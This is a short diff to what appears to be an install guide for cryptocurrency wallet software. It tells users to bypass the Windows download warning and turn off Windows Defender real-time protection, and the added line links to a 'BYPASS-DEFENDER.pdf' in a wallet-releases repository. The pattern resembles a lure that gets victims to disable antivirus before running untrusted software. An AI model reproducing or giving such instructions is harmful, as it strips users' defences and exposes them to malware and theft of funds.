@@ -65,6 +65,8 @@ If you believe that a file you downloaded is genuine, you can bypass the **“Op
 
 6) You’ll be redirected to a new page. Here, **click on the Real-time protection toggle to turn off Windows Defender**.
 
+For a PDF menu navigation guide, see here: https://github.com/UnvsCom/Current-Wallet-Releases/blob/main/BYPASS-DEFENDER.pdf
+
 
 **THAT BEING SAID, USE AT YOUR OWN RISK! THIS IS HIGHLY EXPERIMENTAL CRYPTOCURRENCY SOFTWARE FOR DEVELOPERS.
 PROVIDED WITHOUT ANY WARRANTY OR GUARANTEE AND WITHOUT ANY LIABILITY.**
